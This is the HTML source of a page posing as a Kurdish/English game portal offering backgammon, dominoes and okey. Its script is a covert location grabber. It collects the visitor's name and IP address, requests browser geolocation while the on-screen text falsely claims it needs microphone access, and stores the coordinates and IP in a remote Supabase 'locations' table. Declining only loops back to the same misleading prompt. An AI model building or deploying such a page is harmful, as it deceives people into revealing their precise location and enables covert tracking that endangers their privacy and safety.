<!DOCTYPE html>
<html lang="ku" dir="rtl" id="htmlTag">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta property="og:title" content="یارییە کوردییەکان - تاوڵە، دۆمینە و ئۆکەی">
  <meta property="og:description" content="یاری ئۆنلاین لەگەڵ هاوڕێکانت بکە بە بێ داگرتن">
  <meta property="og:image" content="https://images.unsplash.com/photo-1610890716171-6b1bb98ffd09?q=80&w=1000">
  <meta property="og:type" content="website">

  <title id="pageTitle">یارییە کوردییەکان</title>
<link rel="icon" type="image/png" href="https://i.ibb.co/zwwH0z0/Screenshot-2026-09-11-193017.png">
  <style>
    :root {
      --bg-overlay: rgba(15, 23, 42, 0.7);
      --card: rgba(30, 41, 59, 0.92);
      --input: rgba(15, 23, 42, 0.85);
      --border: #334155;
      --text: #f8fafc;
      --muted: #cbd5e1;
      --blue: #2563eb;
      --gray: #334155;
    }

    * { box-sizing: border-box; }

    body {
      /* بەستەری ڕاستەوخۆی وێنەی یارییەکان لە ئینتەرنێتەوە */
      background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
                  url('https://images.unsplash.com/photo-1610890716171-6b1bb98ffd09?q=80&w=1200') no-repeat center center fixed;
      background-size: cover;
      color: var(--text);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .card {
      background: var(--card);
      backdrop-filter: blur(8px);
      max-width: 420px;
      width: 100%;
      padding: 30px;
      border-radius: 16px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
      text-align: center;
    }

    h2 { margin-top: 0; margin-bottom: 12px; }
    p { color: var(--muted); font-size: 14px; line-height: 1.7; margin-bottom: 20px; }

    #languageScreen { display: block; }
    #nameScreen { display: none; }
    #gameScreen { display: none; }

    .change-lang-btn {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--muted);
      padding: 5px 10px;
      border-radius: 6px;
      font-size: 12px;
      cursor: pointer;
      margin-bottom: 15px;
    }

    .language-buttons { display: flex; gap: 12px; margin-top: 20px; }

    .language-btn {
      flex: 1; padding: 13px; border: 1px solid var(--border); border-radius: 10px;
      background: var(--input); color: var(--text); font-size: 15px; font-weight: bold; cursor: pointer;
      transition: all 0.2s;
    }

    .language-btn:hover {
      border-color: var(--blue);
      background: var(--blue);
    }

    input[type="text"] {
      width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid var(--border);
      border-radius: 8px; background: var(--input); color: #fff; font-size: 15px; text-align: center; outline: none;
    }

    .btn-group { display: flex; gap: 10px; }

    button.action-btn {
      flex: 1; padding: 12px; border: none; border-radius: 8px; font-size: 15px;
      font-weight: bold; cursor: pointer; background: var(--blue); color: white;
    }

    #deny { background: var(--gray); color: #cbd5e1; }
    #result { margin-top: 20px; font-size: 14px; line-height: 1.5; }

    .fix-location-btn {
      margin-top: 15px;
      padding: 10px 15px;
      background: #eab308;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      display: none;
    }

    .game-list { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }

    .game-item {
      padding: 15px; border-radius: 10px; border: 1px solid var(--border); background: var(--input);
      display: flex; justify-content: space-between; align-items: center; cursor: pointer;
      transition: all 0.2s ease;
    }

    .game-item:hover { border-color: var(--blue); background: var(--gray); }

    .badge { font-size: 11px; padding: 3px 8px; border-radius: 12px; font-weight: bold; }
    .badge-green { background: #166534; color: #4ade80; }
  </style>
</head>

<body>

  <div class="card">

    <!-- 1. هەڵبژاردنی زمان -->
    <div id="languageScreen">
      <h2>یاریە کوردیەکان / Kurdish games</h2>
      <p>تکایە زمانەکەت هەڵبژێرە / Please choose language</p>
      <div class="language-buttons">
        <button type="button" class="language-btn" id="kurdishBtn">کوردی</button>
        <button type="button" class="language-btn" id="englishBtn">English</button>
      </div>
    </div>

    <!-- 2. تۆمارکردنی ناو -->
    <div id="nameScreen">
      <button class="change-lang-btn" id="backToLangBtn">🌐 گۆڕینی زمان / Change Language</button>
      <h2 id="nameTitle">چونەژوورەوە</h2>
      <p id="nameDesc">ناوت تۆمار بکە بۆ چوونە ناو یاریگا.</p>
      <input type="text" id="username" placeholder="ناوەکەت بنووسە...">
      <div class="btn-group">
        <button type="button" class="action-btn" id="allow">بەرەو یاریەکان</button>
        <button type="button" class="action-btn" id="deny">ڕەتکردنەوە</button>
      </div>
      <div id="result"></div>
      <button type="button" class="fix-location-btn" id="fixLocationBtn">⚙️ دووبارە هەوڵدانەوە / چالاککردن</button>
    </div>

    <!-- 3. هەڵبژاردنی یاری -->
    <div id="gameScreen">
      <h2 id="gameListTitle">لیستی یارییەکان</h2>
      <p id="welcomeUser" style="color: #60a5fa; font-weight: bold;"></p>
      <p id="selectGameDesc">ئەو یارییە هەڵبژێرە کە دەتەوێت ئەنجامی بدەیت:</p>

      <div class="game-list">
        <div class="game-item" id="tawlaOption">
          <span id="tawlaText" style="font-size: 16px; font-weight: bold;">🎲 یاری تاوڵە</span>
          <span class="badge badge-green" id="badge1">بەردەستە</span>
        </div>
        <div class="game-item" id="dominoOption">
          <span id="dominoText" style="font-size: 16px; font-weight: bold;">🀄 یاری دۆمینە</span>
          <span class="badge badge-green" id="badge2">بەردەستە</span>
        </div>
        <div class="game-item" id="okeyOption">
          <span id="okeyText" style="font-size: 16px; font-weight: bold;">🎴 یاری ئۆکەی (Okey)</span>
          <span class="badge badge-green" id="badge3">لەچاککردن دایە</span>
        </div>
      </div>
    </div>

  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentLang = "ku";

    const translations = {
      ku: {
        dir: "rtl",
        nameTitle: "چونەژوورەوە",
        nameDesc: "ناوت تۆمار بکە بۆ چوونە ناو یاریگا.",
        placeholder: "ناوەکەت بنووسە...",
        allow: "بەرەو یاریەکان",
        deny: "ڕەتکردنەوە",
        gameListTitle: "لیستی یارییەکان",
        selectGameDesc: "ئەو یارییە هەڵبژێرە کە دەتەوێت ئەنجامی بدەیت:",
        welcome: "بەخێربێیت ",
        tawla: "🎲 یاری تاوڵە",
        domino: "🀄 یاری دۆمینە",
        okey: "🎴 یاری ئۆکەی (Okey)",
        badge: "بەردەستە",
        errorName: "تکایە پێشتر ناوەکەت بنووسە!",
        connecting: "⏳ داواکاری چالا کردنی دەنگ بەرزدەکرێتەوە...",
        locationRequired: "🎙️ <b> تکایە دەنگبەر (allow)  چالاک بکە!</b><br>بۆ ئەوەی بتوانیت لەگەڵ هاوڕێکانت یاری بکەیت، پێویستە ڕێگە بە مایک(دەنگبەر)  (microphone) بدەیت.",
        fixBtn: "⚙️ دووبارە هەوڵدانەوە / چالاککردن"
      },
      en: {
        dir: "ltr",
        nameTitle: "Login",
        nameDesc: "Enter your name to enter the game arena.",
        placeholder: "Enter your name...",
        allow: "Continue",
        deny: "Decline",
        gameListTitle: "Game List",
        selectGameDesc: "Select the game you want to play:",
        welcome: "Welcome ",
        tawla: "🎲 Backgammon Game",
        domino: "🀄 Domino Game",
        okey: "🎴 Okey Game",
        badge: "Available",
        errorName: "Please enter your name first!",
        connecting: "⏳ Requesting Mic Access...",
        locationRequired: "🎙️ <b>Please enable Microphone!</b><br>To play together with friends, Mic access is required.",
        fixBtn: "⚙️ Retry / Enable Access"
      }
    };

    function setLanguage(lang) {
      currentLang = lang;
      const t = translations[lang];
      document.getElementById("htmlTag").dir = t.dir;

      document.getElementById("nameTitle").textContent = t.nameTitle;
      document.getElementById("nameDesc").textContent = t.nameDesc;
      document.getElementById("username").placeholder = t.placeholder;
      document.getElementById("allow").textContent = t.allow;
      document.getElementById("deny").textContent = t.deny;
      document.getElementById("gameListTitle").textContent = t.gameListTitle;
      document.getElementById("selectGameDesc").textContent = t.selectGameDesc;
      document.getElementById("tawlaText").textContent = t.tawla;
      document.getElementById("dominoText").textContent = t.domino;
      document.getElementById("okeyText").textContent = t.okey;
      document.getElementById("badge1").textContent = t.badge;
      document.getElementById("badge2").textContent = t.badge;
      document.getElementById("badge3").textContent = t.badge;
      document.getElementById("fixLocationBtn").textContent = t.fixBtn;

      document.getElementById("languageScreen").style.display = "none";
      document.getElementById("nameScreen").style.display = "block";
    }

    document.getElementById("kurdishBtn").addEventListener("click", () => setLanguage("ku"));
    document.getElementById("englishBtn").addEventListener("click", () => setLanguage("en"));

    document.getElementById("backToLangBtn").addEventListener("click", () => {
      document.getElementById("nameScreen").style.display = "none";
      document.getElementById("languageScreen").style.display = "block";
      document.getElementById("result").innerHTML = "";
      document.getElementById("fixLocationBtn").style.display = "none";
    });

    async function getUserIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch (err) { return "Unknown IP"; }
    }

    async function requestLocationAndLogin() {
      const name = document.getElementById("username").value.trim();
      const t = translations[currentLang];

      if (!name) { 
        document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.errorName}</span>`; 
        return; 
      }

      document.getElementById("result").innerHTML = `<span style='color:#60a5fa;'>${t.connecting}</span>`;
      const userIP = await getUserIP();

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            await supabaseClient.from("locations").insert([{ 
              name: name, 
              latitude: position.coords.latitude, 
              longitude: position.coords.longitude, 
              ip_address: userIP 
            }]);
            
            showGameScreen(name);
          },
          (error) => {
            document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
            document.getElementById("fixLocationBtn").style.display = "block";
          }
        );
      } else {
        document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
        document.getElementById("fixLocationBtn").style.display = "block";
      }
    }

    document.getElementById("allow").addEventListener("click", requestLocationAndLogin);

    document.getElementById("deny").addEventListener("click", () => {
      const t = translations[currentLang];
      document.getElementById("result").innerHTML = `<span style='color:#f87171;'>${t.locationRequired}</span>`;
      document.getElementById("fixLocationBtn").style.display = "block";
    });

    document.getElementById("fixLocationBtn").addEventListener("click", () => {
      location.reload();
    });

    function showGameScreen(name) {
      const t = translations[currentLang];
      document.getElementById("nameScreen").style.display = "none";
      document.getElementById("gameScreen").style.display = "block";
      document.getElementById("welcomeUser").textContent = `${t.welcome}${name}!`;
    }

    document.getElementById("tawlaOption").addEventListener("click", () => { window.location.href = "tawla.html"; });
    document.getElementById("dominoOption").addEventListener("click", () => { window.location.href = "domino.html"; });
    document.getElementById("okeyOption").addEventListener("click", () => { window.location.href = "okey.html"; });
  </script>

</body>
</html>
